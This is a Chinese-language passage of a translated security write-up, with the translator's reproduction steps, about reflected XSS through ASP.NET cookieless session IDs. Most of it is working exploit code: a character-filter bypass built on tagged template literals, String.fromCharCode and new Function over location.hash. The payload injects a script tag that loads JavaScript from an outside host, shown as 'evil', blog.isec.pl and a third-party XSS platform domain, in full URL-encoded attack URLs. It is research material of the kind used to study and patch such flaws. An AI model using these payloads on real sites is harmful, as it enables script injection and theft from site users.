    js=document.createElement`script`
创建script元素后，还需要设置src使其指向外部的XSS payload。
由于太多字符列入了黑名单，所以我们用创造了一种通用的方法动态加载我们的外部主机 XSS payload。
另外，ASP.NET的`cookieless session ID`有长度限制，得从其他地方加载JavaScript脚本来绕过。
在VPS上挂一个写了`alert(document.domain)`的脚本，假设路径为`http://evil/xss.js`
当script标签创建的时候，我们需要他的`src`指向外部的XSS payload。
    js.src='//evil/xss.js'
斜杠被禁用了，可以通过`String.fromCharCode`绕过.用`String.fromCharCode`47``绕过`\`，并且将其拼接起来。
    js.src=`${String.fromCharCode`47`}${String.fromCharCode`47`}evil${String.fromCharCode`47`}XSS.JS`
现在我们还需要一个地方放script标签，比如`head`就不错。
    headEl=document.getElementsByTagName`head`[0];
然后我们需要调用`headEl.appendChild(js)` ，然而，事实却出乎意料:
让我们回到`alert`1``的例子.尽管它可以像字符串一样工作，但是当我们传入js表达式的时候，他会产生非常意外的结果。
    alert`${1}`
弹出了一个逗号，而不是预期中的1，事实证明，`alert(`${1}`)`与`alert`${1}``不一样。
后一种语法叫带标签的模板字符串.`function`params``不会将params传入到函数的参数中，它仅仅使用函数修改模板字符串的参数。
(译者注，很难解释这个概念，可以看下官方文档中的例子. )
    function whatsGoingOn()
    {
        console.log(arguments);
    }
    whatsGoingOn`${1}`
    >>> [ [""， ""]， 1 ]
结果中，数组的第一个参数是围绕js表达式的字符串，确认一下:
    whatsGoingOn`LEFT${5-1}RIGHT`
    >>> [ ["LEFT"， "RIGHT"]， 4 ]
这对我们来说是个好消息，JavaScript提供了一个执行代码的方法.如下所示:
    new Function(["whatever"，"whatever"]，"alert(1)")()
    \\等效于
    var test = "alert(1)";
    new Function`whatever${test}whatever`
现在我们要做的只是调用与`headEl.appendChild(js)`等效的方法.但是我们仍然不能使用括号。
我们为什么要关心呢?让我们把`headEl.appendChild(js)`放在URI的hash中，比如`http://localhost/A/B/C/default.aspx#headEl.appendChild(js)`，然后调用`new
Function`上的`document.location.hash`。
还需要摆脱`#`号，可以这样`document.location.hash.substr`1``，最终payload!!!
    js = document.createElement`script`;
    js.src=`${String.fromCharCode`47`}${String.fromCharCode`47`}blog.isec.pl${String.fromCharCode`47`}XSS.JS`;
    headEl=document.getElementsByTagName`head`[0];
    new Function`X${document.location.hash.substr`1`}X`;
    /*
    http://localhost/A/B/C/(A(%22onerror=%22js=document.createElement`script`;js.src=`${String.fromCharCode`47`}${String.fromCharCode`47`}evil${String.fromCharCode`47`}XSS.JS`;headEl=document.getElementsByTagName`head`[0];new%20Function`X${document.location.hash.substr`1`}X`%22))/default.aspx#headEl.appendChild(js)
    */
已在所有主流浏览器(Firefox，Chrome，Edge)上测试这个漏洞。
ASP.NET version |  == 4.0.30319.42000  
---|---  
Firefox | 69.0.1 (64-bit) (the newest version)  
Microsoft Edge | 44.17763.1.0 (the newest version)  
Chrome | 77.0.3865.90 (Official Build) (64-bit) [XSS Auditor needs to be
disabled]  
(译者注，似乎是个通杀全版本ASP.NET version的洞，复现在文章最后)
### 其他方式
`scirpt`标签并非唯一会使用`ResolveUrl`的HTML标签，`link`，`a`，`img`等其他标签同样会使用.下面的代码包含了能导致XSS的HTML标签(对于`a
href`，请使用`onmouseover`或`onclick`代替`onerror`，否则无法使用)。
    " rel="stylesheet">
    " />
    ">click
幸运的是，`ResolveUrl`并非唯一的能将`~`解析为webapp根目录的方法.让我们快速浏览一下其他ASP.NET功能在处理URL中的cookieless
session ID时的行为。
    " />
然后访问最简易的payload:
    http://localhost/A/B/C/(A(%22onerror=%22alert`1`%22))/default.aspx
得到以下结果:
web control 和HTML control在解析`~`时，省略了URL的cookieless部分.不幸的是，我们无法在这些地方进行XSS攻击。
### 摘要
我们学习了关于远古ASP.NET的功能(cookieless
session)的一些知识，为了向后兼容，该功能在现代Web应用程序中仍然存在.此外，我们发现了利用XSS漏的方法，了解了一些JS小技巧，用来在绕过部分字符被过滤的情况
## 复现
翻译完了，应该并不难懂。
但是为了帮助理解，也帮助像我这样从来没接触过.NET开发的菜鸡复现.我再手把手复现展示一下。
### 搭建环境
系统，windows 10 最新版本
官网[下载](https://visualstudio.microsoft.com/zh-hans/vs/)vs2019
community，安装的时候记得勾选C#和.NET相关的组件。
安装完新建项目，记得选`ASP.NET web应用程序(.NET Framework)`，不要选`ASP.NET Core WEB应用程序`，ASP.NET
Core已经弃用了aspx，似乎也弃用了ResolveUrl方法。
下一步，然后可以选择.NET Framework的版本.原文演示的是4.0，但是实际上最新的4.8上同样可用.我们来整个最新的。
再下一步，选空项目就可以。
创建完了，添加一个Web窗体。
把文章开始的代码复制进去
        .NET version: 
然后运行.尝试访问，端口是随机的。
先来看看是不是像他说得这样，访问`https://localhost:44345/(A(ABCD))/xss.aspx`
确实可以，然后是最简单的弹窗.访问`https://localhost:44345/(A(%22onerror=%22alert%601%60%22))/xss.aspx`
最后是完成的payload
    https://localhost:44345/(A(%22onerror=%22js=document.createElement%60script%60;js.src=%60$%7BString.fromCharCode%6047%60%7D$%7BString.fromCharCode%6047%60%7Dxsshs.cn$%7BString.fromCharCode%6047%60%7DQbLA%60;headEl=document.getElementsByTagName%60head%60[0];new%20Function%60X$%7Bdocument.location.hash.substr%601%60%7DX%60%22))/xss.aspx#headEl.appendChild(js)
OK，大功告成。
备注:之前看到linux下也可以通过mono运行aspx程序，测试了下，并没有这个漏洞。